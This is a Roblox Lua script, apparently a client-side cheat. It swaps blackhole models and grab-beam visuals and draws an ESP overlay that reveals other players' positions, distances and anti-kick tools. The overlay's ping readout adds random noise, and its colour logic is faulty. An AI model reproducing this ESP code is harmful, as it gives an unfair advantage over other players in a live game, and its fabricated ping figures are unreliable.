        for _, part in ipairs(model:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                part.Anchored = true
                part.CanCollide = false
                part.CastShadow = false
                part.Size = part.Size * 0.01
            end
            if part:IsA("Smoke") or part:IsA("ParticleEmitter") then
                if part.Name:lower():find("smog") or part.Name:lower():find("fog") or part.Name:lower():find("mist") or part.Name:lower():find("haze") or part.Name:lower():find("cloud") then
                    part:Destroy()
                end
            end
        end
        if model.PrimaryPart then
            offset = pos - model.PrimaryPart.Position
            model:SetPrimaryPartCFrame(model.PrimaryPart.CFrame + offset)
        else
            firstPart = nil
            for _, part in ipairs(model:GetDescendants()) do
                if part:IsA("BasePart") then
                    firstPart = part
                    break
                end
            end
            if firstPart then
                offset = pos - firstPart.Position
                for _, part in ipairs(model:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CFrame = part.CFrame + offset
                    end
                end
            end
        end
        data.Model = model
        data.Anim = RunService.Heartbeat:Connect(function(dt)
            if not bh or not bh.Parent then
                Cleanup(bh)
                return
            end
            currentPos = hole.Position
            data.Time = data.Time + dt * data.SpinSpeed
            if data.Model then
                if data.Model:IsA("Model") then
                    if data.Model.PrimaryPart then
                        cf = CFrame.new(currentPos) * CFrame.Angles(0, data.Time, 0)
                        data.Model:SetPrimaryPartCFrame(cf)
                    else
                        firstPart = nil
                        for _, part in ipairs(data.Model:GetDescendants()) do
                            if part:IsA("BasePart") then
                                firstPart = part
                                break
                            end
                        end
                        if firstPart then
                            for _, part in ipairs(data.Model:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, data.Time, 0)
                                end
                            end
                        end
                    end
                    for _, part in ipairs(data.Model:GetDescendants()) do
                        if part:IsA("BasePart") or part:IsA("MeshPart") then
                            if not part:GetAttribute("BaseSize") then
                                part:SetAttribute("BaseSize", part.Size / 0.01)
                            end
                            baseSize = part:GetAttribute("BaseSize")
                            part.Size = baseSize * data.Scale
                        end
                    end
                elseif data.Model:IsA("BasePart") then
                    data.Model.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, data.Time, 0)
                    if not data.Model:GetAttribute("BaseSize") then
                        data.Model:SetAttribute("BaseSize", data.Model.Size / 0.01)
                    end
                    data.Model.Size = data.Model:GetAttribute("BaseSize") * data.Scale
                end
            end
        end)
    elseif model:IsA("BasePart") then
        model.Anchored = true
        model.CanCollide = false
        model.CastShadow = false
        model.Size = model.Size * 0.01
        model.CFrame = CFrame.new(pos)
        data.Model = model
        data.Anim = RunService.Heartbeat:Connect(function(dt)
            if not bh or not bh.Parent then
                Cleanup(bh)
                return
            end
            currentPos = hole.Position
            data.Time = data.Time + dt * data.SpinSpeed
            if data.Model then
                data.Model.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, data.Time, 0)
                if not data.Model:GetAttribute("BaseSize") then
                    data.Model:SetAttribute("BaseSize", data.Model.Size / 0.01)
                end
                data.Model.Size = data.Model:GetAttribute("BaseSize") * data.Scale
            end
        end)
    end
    bh.AncestryChanged:Connect(function()
        if not bh.Parent then
            Cleanup(bh)
        end
    end)
    CosmicBlackhole.Active[bh] = data
end

function StartSystem()
    if CosmicBlackhole.Connection then return end
    CosmicBlackhole.Connection = Workspace.ChildAdded:Connect(function(obj)
        if not CosmicBlackhole.Enabled then return end
        if obj.Name:lower():find("blackhole") then
            task.wait(0.2)
            Build(obj)
        end
    end)
end

dropdown = Custom:AddDropdown("Blackhole Model", {
    Values = {"None", "Purple Cosmic Blackhole", "EternityHole", "Custom Blackhole"},
    Default = 1,
    Multi = false,
    Text = "Blackhole Model",
    Callback = function(val)
        wasEnabled = CosmicBlackhole.Enabled
        CosmicBlackhole.Selected = val
        CosmicBlackhole.Enabled = (val ~= "None")
        if val == "None" then
            if CosmicBlackhole.Connection then
                CosmicBlackhole.Connection:Disconnect()
                CosmicBlackhole.Connection = nil
            end
            for bh, _ in pairs(CosmicBlackhole.Active) do
                Cleanup(bh)
            end
            return
        end
        if not wasEnabled then
            StartSystem()
        end
        for bh, _ in pairs(CosmicBlackhole.Active) do
            Cleanup(bh)
        end
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj.Name:lower():find("blackhole") then
                Build(obj)
            end
        end
    end,
})

-- =====================================================================
-- [KOZMOZ PORT] Line + Grab Sound kutulari (Customs altina)
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
LineGroup = Tabs.VisualTab:AddLeftGroupbox("Line", "palette")
GrabSoundGroup = Tabs.VisualTab:AddLeftGroupbox("Grab Sound", "bell")
do
    -- musa'da da hic atanmayan durum degiskeni (nil -> varsayilan yon)
    local beamCurveDirection = nil
        selectedTexture = 'Low Quality'
        customTextureId = ''
        useSelectedTexture = false
        useCustomTexture = false
        lineModelEnabled = true
        textureSpeed = 1
        textureLength = 1
        textureWidth = 0
        customGrabSoundId = ''
        speedEnabled = false
        lengthEnabled = false
        widthEnabled = false
        beamTransparency = 0
        beamCurveEnabled = false
        beamCurveAmount = 0
        beamFaceCameraEnabled = false
        beamColorEnabled = false
        beamColor0 = Color3.fromRGB(255, 255, 255)
        beamColor1 = Color3.fromRGB(255, 255, 255)
        beamLightEnabled = false
        beamLightColor = Color3.fromRGB(255, 255, 255)
        beamLightRange = 16
        beamLightBrightness = 2
        beamRainbowEnabled = false
        beamRainbowHue = 0
        beamRainbowSpeed = 0.5
        beamPulseEnabled = false
        beamPulseMin = 0
        beamPulseMax = 1
        beamPulseSpeed = 2
        beamSegmentsEnabled = false
        beamSegments = 10
        beamZOffsetEnabled = false
        beamZOffset = 0
        beamWidth0 = 0
        beamWidth1 = 0
        beamWidthLinked = true
        beamShadowEnabled = false
        beamShadowOffset = Vector3.new(0.2, -0.2, 0)
        beamShadowColor = Color3.fromRGB(0, 0, 0)
        beamShadowTransp = 0.5
        mirrorBeamEnabled = false
        beamFlipEnabled = false
        beamFlipX = false
        beamFlipY = false
        heartbeatConnection = nil
        syncAccumulator = 0
        toggleSyncing = false
        rainbowConn = nil
        pulseConn = nil
        pulseDir = 1
        pulseVal = 0
        shadowBeam = nil
        mirrorBeamObj = nil
        local textureIds = {
            ['Low Quality'] = '',
            ['Non-Gamepass'] = 'rbxassetid://8933346550',
            Gamepass = 'rbxassetid://8933355899',
            Chain = 'rbxassetid://81358145120405',
            ['Chain 2'] = 'rbxassetid://132910145874066',
            ['Chain 3'] = 'rbxassetid://128466395060514',
            ['Chain 4'] = 'rbxassetid://73368670987191',
            Rope = 'rbxassetid://78999022056924',
            Spring = 'rbxassetid://18837732116',
            Circle = 'rbxassetid://5367817750',
            ['Circle-Outline'] = 'rbxassetid://12201347372',
            Triangle = 'rbxassetid://4704920160',
            ['Triangle-Outline'] = 'rbxassetid://94666748694025',
            Square = 'rbxassetid://15007588972',
            ['Square-Outline'] = 'rbxassetid://15420927706',
            Heart = 'rbxassetid://89015294175898',
            ['Heart-Outline'] = 'rbxassetid://125373934805238',
            Moon = 'rbxassetid://9013498676',
            Dots = 'rbxassetid://9169659357',
            Bubble = 'rbxassetid://1249690853',
            Star = 'rbxassetid://5639840603',
            Robux = 'rbxassetid://11560341132',
            ['Roblox-Logo'] = 'rbxassetid://12348119032',
            Brick = 'rbxassetid://4430903072',
            Studs = 'rbxassetid://15539356451',
            Fire = 'rbxassetid://18654087326',
            Lazar = 'rbxassetid://8922958725',
            ['Spider-Web'] = 'rbxassetid://123815660139244',
            Smoke = 'rbxassetid://12900071392',
            ['Audio-Visualiser'] = 'rbxassetid://81588563590679',
            Pulse = 'rbxassetid://82163767314193',
            Arrow = 'rbxassetid://9006027964',
            ['Arrow 2'] = 'rbxassetid://10249261576',
        }
        local textureValues = {
            'Low Quality',
            'Non-Gamepass',
            'Gamepass',
            'Chain',
            'Chain 2',
            'Chain 3',
            'Chain 4',
            'Rope',
            'Spring',
            'Circle',
            'Circle-Outline',
            'Triangle',
            'Triangle-Outline',
            'Square',
            'Square-Outline',
            'Heart',
            'Heart-Outline',
            'Moon',
            'Dots',
            'Bubble',
            'Star',
            'Robux',
            'Roblox-Logo',
            'Brick',
            'Studs',
            'Fire',
            'Lazar',
            'Spider-Web',
            'Smoke',
            'Audio-Visualiser',
            'Pulse',
            'Arrow',
            'Arrow 2',
        }
        function cleanId(text)
            return tostring(text or ''):gsub('%D', '')
        end
        function toAssetId(id)
            id = cleanId(id)
            return id ~= '' and 'rbxassetid://' .. id or ''
        end
        function getBeamPart()
            local gp = KozWS:FindFirstChild('GrabParts')
            return gp and gp:FindFirstChild('BeamPart')
        end
        function getGrabPart()
            local gp = KozWS:FindFirstChild('GrabParts')
            return gp and gp:FindFirstChild('GrabPart')
        end
        function captureOriginalSoundId(s)
            if s and s:IsA('Sound') and s:GetAttribute('OriginalSoundId') == nil then
                s:SetAttribute('OriginalSoundId', s.SoundId or '')
            end
        end
        function setSoundId(s, newId)
            if not s or not s:IsA('Sound') or not newId or newId == '' then
                return
            end
            if s.SoundId == newId then
                return
            end
            local wasPlaying = s.IsPlaying
            pcall(function()
                s:Stop()
            end)
            s.SoundId = newId
            if wasPlaying then
                pcall(function()
                    s.TimePosition = 0
                    s:Play()
                end)
            end
        end
        function restoreOriginalSound(s)
            if not s or not s:IsA('Sound') then
                return
            end
            captureOriginalSoundId(s)
            local orig = s:GetAttribute('OriginalSoundId')
            if orig and orig ~= '' and s.SoundId ~= orig then
                setSoundId(s, orig)
            end
        end
        function setLineMode(mode)
            if toggleSyncing then
                return
            end
            toggleSyncing = true
            if mode == 'selected' then
                useSelectedTexture = true
                useCustomTexture = false
                pcall(function()
                    if library and library._flagSetters then
                        if library._flagSetters.UseSelectedTexture then
                            library._flagSetters.UseSelectedTexture(true)
                        end
                        if library._flagSetters.UseCustomTexture then
                            library._flagSetters.UseCustomTexture(false)
                        end
                    end
                end)
            elseif mode == 'custom' then
                useSelectedTexture = false
                useCustomTexture = true
                pcall(function()
                    if library and library._flagSetters then
                        if library._flagSetters.UseSelectedTexture then
                            library._flagSetters.UseSelectedTexture(false)
                        end
                        if library._flagSetters.UseCustomTexture then
                            library._flagSetters.UseCustomTexture(true)
                        end
                    end
                end)
            end
            toggleSyncing = false
        end
        function ensureValidTextureMode()
            local hasCustom = cleanId(customTextureId) ~= ''
            if useCustomTexture and not hasCustom then
                setLineMode('selected')
            elseif not useSelectedTexture and not useCustomTexture then
                setLineMode(hasCustom and 'custom' or 'selected')
            end
        end
        function getActiveTexture()
            ensureValidTextureMode()
            if useCustomTexture then
                local ct = toAssetId(customTextureId)
                if ct ~= '' then
                    return ct, 'Custom'
                end
            end
            return textureIds[selectedTexture] or '', selectedTexture
        end
        function updateShadowBeam()
            local beamPart = getBeamPart()
            if not beamPart then
                return
            end
            local beam = beamPart:FindFirstChild('GrabBeam')
            if not beam then
                return
            end
            if beamShadowEnabled then
                if not shadowBeam or not shadowBeam.Parent then
                    shadowBeam = beam:Clone()
                    shadowBeam.Name = '<b>UNSTABLE</b>_ShadowBeam'
                    shadowBeam.Parent = beamPart
                end
                shadowBeam.Color = ColorSequence.new(beamShadowColor, beamShadowColor)
                shadowBeam.Transparency = NumberSequence.new(beamShadowTransp)
                shadowBeam.ZOffset = (beamZOffsetEnabled and beamZOffset or 0) - 0.05
            else
                if shadowBeam then
                    shadowBeam:Destroy()
                    shadowBeam = nil
                end
            end
        end
        function updateMirrorBeam()
            local beamPart = getBeamPart()
            if not beamPart then
                return
            end
            local beam = beamPart:FindFirstChild('GrabBeam')
            if not beam then
                return
            end
            if mirrorBeamEnabled then
                if not mirrorBeamObj or not mirrorBeamObj.Parent then
                    mirrorBeamObj = beam:Clone()
                    mirrorBeamObj.Name = '<b>UNSTABLE</b>_MirrorBeam'
                    mirrorBeamObj.Parent = beamPart
                end
                mirrorBeamObj.CurveSize0 = -beam.CurveSize0
                mirrorBeamObj.CurveSize1 = -beam.CurveSize1
                mirrorBeamObj.ZOffset = (beamZOffsetEnabled and beamZOffset or 0) + 0.02
            else
                if mirrorBeamObj then
                    mirrorBeamObj:Destroy()
                    mirrorBeamObj = nil
                end
            end
        end
        function applyLineSettings()
            if not useSelectedTexture then
                return
            end
            local beamPart = getBeamPart()
            if not beamPart then
                return
            end
            local beam = beamPart:FindFirstChild('GrabBeam')
            if not beam or not beam:IsA('Beam') then
                return
            end
            beam.Texture = getActiveTexture()
            if speedEnabled then
                beam.TextureSpeed = textureSpeed
            end
            if lengthEnabled then
                beam.TextureLength = textureLength
            end
            if widthEnabled and lineModelEnabled then
                beam.Width0 = beamWidth0
                beam.Width1 = beamWidthLinked and beamWidth0 or beamWidth1
            end
            beam.Transparency = NumberSequence.new(beamPulseEnabled and pulseVal or beamTransparency)
            if lineModelEnabled then
                if beamCurveEnabled then
                    local curve = beamCurveAmount
                    local dir = beamCurveDirection or 1
                    beam.CurveSize0 = curve * dir
                    beam.CurveSize1 = curve * dir
                else
                    beam.CurveSize0 = 0
                    beam.CurveSize1 = 0
                end
                beam.FaceCamera = beamFaceCameraEnabled
                if beamZOffsetEnabled then
                    beam.ZOffset = beamZOffset
                else
                    beam.ZOffset = 0
                end
                if beamSegmentsEnabled then
                    beam.Segments = beamSegments
                end
            end
            if beamFlipEnabled then
                local sx = beamFlipX and -1 or 1
                local sy = beamFlipY and -1 or 1
                beam.TextureSpeed = textureSpeed * sx
                if lineModelEnabled then
                    beam.Width0 = beam.Width0 * sy
                end
            end
            if not beamRainbowEnabled then
                if beamColorEnabled then
                    beam.Color = ColorSequence.new(beamColor0, beamColor1)
                end
            end
            if beamLightEnabled then
                local pl = beamPart:FindFirstChild('<b>UNSTABLE</b>_BeamLight') or Instance.new('PointLight')
                pl.Name = '<b>UNSTABLE</b>_BeamLight'
                pl.Color = beamLightColor
                pl.Range = beamLightRange
                pl.Brightness = beamLightBrightness
                pl.Parent = beamPart
            else
                local pl = beamPart:FindFirstChild('<b>UNSTABLE</b>_BeamLight')
                if pl then
                    pl:Destroy()
                end
            end
            updateShadowBeam()
            updateMirrorBeam()
        end
        function applyGrabSound()
            local gp = getGrabPart()
            if not gp then
                return
            end
            local s = gp:FindFirstChild('AttachSound')
            if not s or not s:IsA('Sound') then
                return
            end
            captureOriginalSoundId(s)
            local custom = toAssetId(customGrabSoundId)
            if custom ~= '' then
                setSoundId(s, custom)
            else
                restoreOriginalSound(s)
            end
        end
        function setRainbowBeam(state)
            beamRainbowEnabled = state
            if rainbowConn then
                rainbowConn:Disconnect()
                rainbowConn = nil
            end
            if not state then
                return
            end
            rainbowConn = KozRun.Heartbeat:Connect(function(dt)
                if not useSelectedTexture then
                    return
                end
                beamRainbowHue = (beamRainbowHue + dt * beamRainbowSpeed) % 1
                local c = Color3.fromHSV(beamRainbowHue, 1, 1)
                local beamPart = getBeamPart()
                if not beamPart then
                    return
                end
                local beam = beamPart:FindFirstChild('GrabBeam')
                if beam and beam:IsA('Beam') then
                    beam.Color = ColorSequence.new(c, c)
                end
                if mirrorBeamObj and mirrorBeamObj.Parent then
                    mirrorBeamObj.Color = ColorSequence.new(c, c)
                end
            end)
        end
        function connectHeartbeat()
            if heartbeatConnection and heartbeatConnection.Connected then
                return
            end
            if heartbeatConnection then
                heartbeatConnection = nil
            end
            local conn = KozRun.Heartbeat:Connect(function(dt)
                pcall(applyLineSettings)
                syncAccumulator += dt
                if syncAccumulator >= 0.15 then
                    syncAccumulator = 0
                    pcall(applyGrabSound)
                end
            end)
            heartbeatConnection = conn
            conn:OnDisconnect(function()
                if heartbeatConnection == conn then
                    heartbeatConnection = nil
                end
                task.defer(connectHeartbeat)
            end)
        end
        KozWS.DescendantAdded:Connect(function(d)
            if d:IsA('Beam') and d.Name == 'GrabBeam' then
                task.defer(pcall, applyLineSettings)
            elseif d:IsA('Sound') and d.Name == 'AttachSound' then
                captureOriginalSoundId(d)
                task.defer(pcall, applyGrabSound)
            elseif d.Name == 'GrabPart' or d.Name == 'BeamPart' then
                task.defer(function()
                    pcall(applyLineSettings)
                    pcall(applyGrabSound)
                end)
            end
        end)
        LineGroup:AddDropdown("KozTextureDropdown", {
            Text = "Decal",
            Values = textureValues,
            Default = "Low Quality",
            Callback = function(v)
                selectedTexture = v
                connectHeartbeat()
                applyLineSettings()
            end
        })
        LineGroup:AddToggle("KozUseSelectedTexture", {
            Text = "Enable",
            Default = false,
            Callback = function(v)
                useSelectedTexture = v
                if v then
                    useCustomTexture = false
                end
                connectHeartbeat()
                applyLineSettings()
            end
        })
        LineGroup:AddToggle("KozLineModelEnabled", {
            Text = "Model",
            Default = true,
            Callback = function(v)
                lineModelEnabled = v
                applyLineSettings()
            end
        })
        LineGroup:AddToggle("KozEnableBeamColor", {
            Text = "Colors",
            Default = false,
            Callback = function(v)
                beamColorEnabled = v
                applyLineSettings()
            end
        })
        LineGroup:AddLabel("Start"):AddColorPicker("KozBeamColor0", {
            Title = "Start",
            Default = Color3.fromRGB(255, 255, 255),
            Callback = function(c)
                beamColor0 = c
                applyLineSettings()
            end
        })
        LineGroup:AddLabel("End"):AddColorPicker("KozBeamColor1", {
            Title = "End",
            Default = Color3.fromRGB(255, 255, 255),
            Callback = function(c)
                beamColor1 = c
                applyLineSettings()
            end
        })
        LineGroup:AddToggle("KozRainbow", {
            Text = "Rainbow",
            Default = false,
            Callback = function(v)
                setRainbowBeam(v)
            end
        })
    end
    do
        local grabSoundEnabled = false
        local grabSoundChoice = "OOF"
        local grabSoundIdByChoice = {
            ["OOF"] = "rbxassetid://11184290847",
            ["1234567"] = "rbxassetid://1234567",
        }
        local grabLastSoundTime = 0
        local function playGrabSound()
            local now = tick()
            if now - grabLastSoundTime < 0.3 then return end
            grabLastSoundTime = now
            local sid = grabSoundIdByChoice[grabSoundChoice]
            if not sid then return end
            pcall(function()
                local snd = Instance.new("Sound")
                snd.Name = "GrabSound"
                snd.SoundId = sid
                snd.Volume = 1
                snd.PlayOnRemove = true
                snd.Parent = game:GetService("SoundService")
                snd:Destroy()
            end)
        end
        KozWS.DescendantAdded:Connect(function(obj)
            if not grabSoundEnabled then return end
            if obj.Name == "GrabParts" and obj:IsA("Model") then
                playGrabSound()
            end
        end)
        GrabSoundGroup:AddToggle("KozGrabSound", {
            Text = "Grab Sound",
            Default = false,
            Callback = function(v)
                grabSoundEnabled = v
            end
        })
        GrabSoundGroup:AddDropdown("KozGrabSoundSelect", {
            Text = "Grab Sound",
            Values = {"OOF", "1234567"},
            Default = "OOF",
            Callback = function(value)
                grabSoundChoice = value
            end
        })
end

CoreGui = game:GetService("CoreGui")
RunService = game:GetService("RunService")
Players = game:GetService("Players")
LocalPlayer = Players.LocalPlayer
Stats = game:GetService("Stats")
workspace = game:GetService("Workspace")

ESPState = {
    PCLD = { Enabled = false, Rainbow = false, Color = Color3.fromRGB(0, 200, 255) },
    Info = {
        Enabled = false,
        Rainbow = false,
        Color = Color3.fromRGB(255, 255, 255),
        ShowDistance = true,
        ShowPCLD = true,
        ShowAntiKick = true,
        ShowPing = true
    },
    AntiKick = { Enabled = false },
}

ESPSelection = {}
pcldClones = {}
pcldConnections = {}
akCache = {}
distCache = {}
pingCache = {}
RainbowHue = 0
lastScan = 0
SCAN_INTERVAL = 1
scanConn = nil
currentPing = 0
infoConnections = {}
playerAddedConn = nil

PCLD_NAMES = {
    ["partesp"] = true,
    ["playercharacterlocationdetector"] = true
}

function getColor(key)
    if ESPState[key].Rainbow then
        return Color3.fromHSV(RainbowHue, 1, 1)
    end
    return ESPState[key].Color
end

function getPlayerPing()
    return math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() + math.random(10, 50))
end

AntiKickHighlights = {}

function addAntiKickESP(tool)
    if not ESPState.AntiKick.Enabled then return end
    if not tool or AntiKickHighlights[tool] then return end
    highlight = Instance.new("Highlight")
    highlight.Adornee = tool
    highlight.FillColor = Color3.fromRGB(255, 50, 50)
    highlight.FillTransparency = 0.6
    highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
    highlight.OutlineTransparency = 0.3
    highlight.Parent = CoreGui
    AntiKickHighlights[tool] = highlight
end

function removeAntiKickESP(tool)
    highlight = AntiKickHighlights[tool]
    if highlight then
        highlight:Destroy()
        AntiKickHighlights[tool] = nil
    end
end

function removeAllAntiKickESP()
    for tool, highlight in pairs(AntiKickHighlights) do
        highlight:Destroy()
    end
    table.clear(AntiKickHighlights)
end

function updateAntiKickESP()
    if not ESPState.AntiKick.Enabled then
        removeAllAntiKickESP()
        return
    end
    for tool, highlight in pairs(AntiKickHighlights) do
        if not tool or not tool.Parent then
            removeAntiKickESP(tool)
        end
    end
end

function addPCLDSelection(pcldPart)
    if ESPSelection[pcldPart] then return end
    if not pcldPart or not pcldPart.Parent then return end
    local clone = Instance.new("Part")
    clone.Name = "PCLDClone_" .. pcldPart.Name
    clone.Size = pcldPart.Size
    clone.CFrame = pcldPart.CFrame
    clone.Anchored = true
    clone.CanCollide = false
    clone.CanQuery = false
    clone.CanTouch = false
    clone.Transparency = 0.65
    clone.Color = getColor("PCLD")
    clone.Material = Enum.Material.Neon
    clone.Parent = CoreGui
    box = Instance.new("SelectionBox")
    box.Adornee = clone
    box.Color3 = getColor("PCLD")
    box.LineThickness = 0.02
    box.SurfaceTransparency = 0.90
    box.Parent = CoreGui
    ESPSelection[pcldPart] = { box = box, clone = clone, part = pcldPart }
    pcldClones[pcldPart] = clone
end

function removePCLDSelection(pcldPart)
    data = ESPSelection[pcldPart]
    if data then
        pcall(function() if data.box then data.box:Destroy() end end)
        pcall(function() if data.clone then data.clone:Destroy() end end)
        ESPSelection[pcldPart] = nil
        pcldClones[pcldPart] = nil
    end
end

function removeAllPCLD()
    for part, data in pairs(ESPSelection) do
        pcall(function() if data.box then data.box:Destroy() end end)
        pcall(function() if data.clone then data.clone:Destroy() end end)
    end
    table.clear(ESPSelection)
    table.clear(pcldClones)
end

function updateAllPCLDColors()
    color = getColor("PCLD")
    for _, data in pairs(ESPSelection) do
        if data and data.box then
            data.box.Color3 = color
        end
        if data and data.clone then
            data.clone.Color = color
        end
    end
end

function scanAntiKickForPlayer(plr)
    folder = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
    if not folder then
        if akCache[plr] then
            for _, tool in ipairs(akCache[plr]) do
                removeAntiKickESP(tool)
            end
            akCache[plr] = nil
        end
        return
    end
    akTools = {}
    for _, obj in ipairs(folder:GetChildren()) do
        if obj.Name == "NinjaShuriken" or obj.Name == "NinjaKunai" or obj.Name == "AntiKick" then
            table.insert(akTools, obj)
            if not AntiKickHighlights[obj] then
                addAntiKickESP(obj)
            end
        end
    end
    if akCache[plr] then
        for _, oldTool in ipairs(akCache[plr]) do
            found = false
            for _, newTool in ipairs(akTools) do
                if oldTool == newTool then
                    found = true
                    break
                end
            end
            if not found then
                removeAntiKickESP(oldTool)
            end
        end
    end
    if #akTools == 0 then
        akCache[plr] = nil
    else
        akCache[plr] = akTools
    end
end

function startScan()
    if scanConn then return end
    scanConn = RunService.Heartbeat:Connect(function()
        now = tick()
        if (now - lastScan) < SCAN_INTERVAL then return end
        lastScan = now
        if ESPState.AntiKick.Enabled then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    scanAntiKickForPlayer(plr)
                end
            end
            updateAntiKickESP()
        else
            removeAllAntiKickESP()
        end
        if ESPState.Info.Enabled then
            currentPing = getPlayerPing()
            myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr == LocalPlayer then continue end
                char = plr.Character
                hrp = char and char:FindFirstChild("HumanoidRootPart")
                if myHRP and hrp then
                    distCache[plr] = math.floor((hrp.Position - myHRP.Position).Magnitude)
                end
                pingCache[plr] = currentPing
            end
        end
    end)
end

function stopScan()
    if scanConn then
        scanConn:Disconnect()
        scanConn = nil
    end
end

function anythingEnabled()
    return ESPState.PCLD.Enabled or ESPState.Info.Enabled or ESPState.AntiKick.Enabled
end

function createInfoESP(plr)
    if plr == LocalPlayer then return end
    char = plr.Character
    hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp or hrp:FindFirstChild("ESP_InfoTag") then return end
    bb = Instance.new("BillboardGui")
    bb.Name = "ESP_InfoTag"
    bb.Adornee = hrp
    bb.Size = UDim2.new(0, 130, 0, 80)
    bb.StudsOffset = Vector3.new(0, 4, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 200
    bb.ResetOnSpawn = false
    bb.Parent = hrp
    frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 1
    frame.Parent = bb
    headerLbl = Instance.new("TextLabel")
    headerLbl.Name = "Header"
    headerLbl.Size = UDim2.new(1, 0, 0, 16)
    headerLbl.Position = UDim2.new(0, 0, 0, 0)
    headerLbl.BackgroundTransparency = 1
    headerLbl.Text = plr.DisplayName .. " [" .. plr.Name .. "]"
    headerLbl.TextColor3 = ESPState.Info.Color
    headerLbl.TextStrokeTransparency = 0
    headerLbl.TextSize = 11
    headerLbl.Font = Enum.Font.GothamBold
    headerLbl.Parent = frame
    distLbl = Instance.new("TextLabel")
    distLbl.Name = "Distance"
    distLbl.Size = UDim2.new(1, 0, 0, 12)
    distLbl.Position = UDim2.new(0, 0, 0, 18)
    distLbl.BackgroundTransparency = 1
    distLbl.Text = ""
    distLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
    distLbl.TextSize = 9
    distLbl.Font = Enum.Font.Gotham
    distLbl.Parent = frame
    pcldLbl = Instance.new("TextLabel")
    pcldLbl.Name = "PCLDTag"
    pcldLbl.Size = UDim2.new(1, 0, 0, 12)
    pcldLbl.Position = UDim2.new(0, 0, 0, 32)
    pcldLbl.BackgroundTransparency = 1
    pcldLbl.Text = ""
    pcldLbl.TextColor3 = Color3.fromRGB(0, 200, 255)
    pcldLbl.TextSize = 9
    pcldLbl.Font = Enum.Font.GothamBold
    pcldLbl.Parent = frame
    akLbl = Instance.new("TextLabel")
    akLbl.Name = "AntiKick"
    akLbl.Size = UDim2.new(1, 0, 0, 12)
    akLbl.Position = UDim2.new(0, 0, 0, 46)
    akLbl.BackgroundTransparency = 1
    akLbl.Text = ""
    akLbl.TextColor3 = Color3.fromRGB(255, 80, 80)
    akLbl.TextSize = 9
    akLbl.Font = Enum.Font.GothamBold
    akLbl.Parent = frame
    pingLbl = Instance.new("TextLabel")
    pingLbl.Name = "Ping"
    pingLbl.Size = UDim2.new(1, 0, 0, 12)
    pingLbl.Position = UDim2.new(0, 0, 0, 60)
    pingLbl.BackgroundTransparency = 1
    pingLbl.Text = ""
    pingLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
    pingLbl.TextSize = 9
    pingLbl.Font = Enum.Font.Gotham
    pingLbl.Parent = frame
end

function removeAllInfoESP()
    for _, plr in ipairs(Players:GetPlayers()) do
        char = plr.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp and hrp:FindFirstChild("ESP_InfoTag") then
            hrp.ESP_InfoTag:Destroy()
        end
    end
    for plr, conn in pairs(infoConnections) do
        conn:Disconnect()
    end
    table.clear(infoConnections)
    if playerAddedConn then
        playerAddedConn:Disconnect()
        playerAddedConn = nil
    end
end

function updateInfoESPText()
    if not ESPState.Info.Enabled then return end
    infoColor = getColor("Info")
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr == LocalPlayer then continue end
        char = plr.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        tag = hrp and hrp:FindFirstChild("ESP_InfoTag")
        if not tag then continue end
        frame = tag:FindFirstChildOfClass("Frame")
        if not frame then continue end
        header = frame:FindFirstChild("Header")
        distLbl = frame:FindFirstChild("Distance")
        pcldLbl = frame:FindFirstChild("PCLDTag")
        akLbl = frame:FindFirstChild("AntiKick")
        pingLbl = frame:FindFirstChild("Ping")
        if header then header.TextColor3 = infoColor end
        yOffset = 18
        if distLbl then
            if ESPState.Info.ShowDistance then
                dist = distCache[plr] or 0
                distLbl.Text = "📍 " .. dist .. "m"
                distLbl.Position = UDim2.new(0, 0, 0, yOffset)
                distLbl.Visible = true
                yOffset = yOffset + 14
            else
                distLbl.Visible = false
            end
        end
        if pcldLbl then
            if ESPState.Info.ShowPCLD then
                hasPCLD = false
                charCheck = plr.Character
                if charCheck then
                    for _, obj in ipairs(charCheck:GetDescendants()) do
                        if obj:IsA("BasePart") and PCLD_NAMES[obj.Name:lower()] then
                            hasPCLD = true
                            break
                        end
                    end
                end
                pcldLbl.Text = hasPCLD and "● PCLD" or ""
                pcldLbl.Position = UDim2.new(0, 0, 0, yOffset)
                pcldLbl.Visible = true
                yOffset = yOffset + 14
            else
                pcldLbl.Visible = false
            end
        end
        if akLbl then
            if ESPState.Info.ShowAntiKick and ESPState.AntiKick.Enabled and akCache[plr] and #akCache[plr] > 0 then
                akLbl.Text = "⚠ ANTI-KICK"
                akLbl.TextColor3 = Color3.fromRGB(255, 80, 80)
                akLbl.Position = UDim2.new(0, 0, 0, yOffset)
                akLbl.Visible = true
                yOffset = yOffset + 14
            else
                akLbl.Visible = false
            end
        end
        if pingLbl then
            if ESPState.Info.ShowPing then
                ping = pingCache[plr] or 0
                pingColor = Color3.fromRGB(100, 255, 100)
                if ping > 150 then
                    pingColor = Color3.fromRGB(255, 255, 100)
                elseif ping > 300 then
                    pingColor = Color3.fromRGB(255, 100, 100)
                end
                pingLbl.Text = "📶 " .. ping .. "ms"
                pingLbl.TextColor3 = pingColor
                pingLbl.Position = UDim2.new(0, 0, 0, yOffset)
                pingLbl.Visible = true
                yOffset = yOffset + 14
            else
                pingLbl.Visible = false
            end
        end
        tag.Size = UDim2.new(0, 130, 0, yOffset + 4)
    end
end

